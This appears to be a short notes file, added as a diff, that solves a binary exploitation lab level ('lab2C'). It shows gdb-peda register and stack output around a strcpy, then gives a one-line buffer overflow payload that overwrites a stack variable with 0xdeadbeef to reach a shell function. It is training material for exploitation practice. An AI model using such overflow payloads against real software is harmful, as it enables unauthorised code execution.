@@ -1,0 +1,43 @@
+instruction @ 0x8048718 compares 0xdeadbeef to esp+0x2c
+
+Stack at breakpoint:
+
+gdb-peda$ run 'AAAABBBBCCCCDDDDEEEEFFFF'
+Starting program: /levels/lab02/lab2C 'AAAABBBBCCCCDDDDEEEEFFFF'
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff6bd ("AAAABBBBCCCCDDDDEEEEFFFF")
+EBX: 0xb7fcd000 --> 0x1a9da8 
+ECX: 0xbffff8c0 ("CDDDDEEEEFFFF")
+EDX: 0xbffff6c8 ("CDDDDEEEEFFFF")
+ESI: 0x0 
+EDI: 0x0 
+EBP: 0xbffff6d8 --> 0x0 
+ESP: 0xbffff6a0 --> 0xbffff6bd ("AAAABBBBCCCCDDDDEEEEFFFF")
+EIP: 0x8048718 (<main+75>:	cmp    DWORD PTR [esp+0x2c],0xdeadbeef)
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804870c <main+63>:	lea    eax,[esp+0x1d]
+   0x8048710 <main+67>:	mov    DWORD PTR [esp],eax
+   0x8048713 <main+70>:	call   0x8048560 <strcpy@plt>
+=> 0x8048718 <main+75>:	cmp    DWORD PTR [esp+0x2c],0xdeadbeef
+   0x8048720 <main+83>:	jne    0x8048729 <main+92>
+   0x8048722 <main+85>:	call   0x80486ad <shell>
+   0x8048727 <main+90>:	jmp    0x804873d <main+112>
+   0x8048729 <main+92>:	mov    eax,DWORD PTR [esp+0x2c]
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff6a0 --> 0xbffff6bd ("AAAABBBBCCCCDDDDEEEEFFFF")
+0004| 0xbffff6a4 --> 0xbffff8b5 ("AAAABBBBCCCCDDDDEEEEFFFF")
+0008| 0xbffff6a8 --> 0x804a000 --> 0x8049f14 --> 0x1 
+0012| 0xbffff6ac --> 0x80487a2 (<__libc_csu_init+82>:	add    edi,0x1)
+0016| 0xbffff6b0 --> 0x2 
+0020| 0xbffff6b4 --> 0xbffff774 --> 0xbffff8a1 ("/levels/lab02/lab2C")
+0024| 0xbffff6b8 --> 0xbffff780 --> 0xbffff8ce ("XDG_SESSION_ID=2")
+0028| 0xbffff6bc ("-AAAABBBBCCCCDDDDEEEEFFFF")
+[------------------------------------------------------------------------------]
+
+
+A*15 + 0xdeadbeef
+
+Solution:
+
+./lab2C $(python -c 'print "A"*15 + "\xef\xbe\xad\xde"')
